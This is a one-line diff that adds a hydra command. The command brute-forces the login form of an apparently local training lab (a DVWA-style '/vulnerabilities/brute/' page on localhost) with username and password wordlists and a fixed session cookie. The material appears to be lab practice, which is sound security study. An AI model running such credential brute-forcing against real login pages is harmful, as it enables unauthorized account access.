@@ -1,0 +1,1 @@
+hydra -L usernames.txt -P top-passwords-shortlist.txt 'http-get-form://localhost:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=cfaea3510c80cf95b6f8e80a10b5ca40; security=low:F=Username and/or password incorrect'
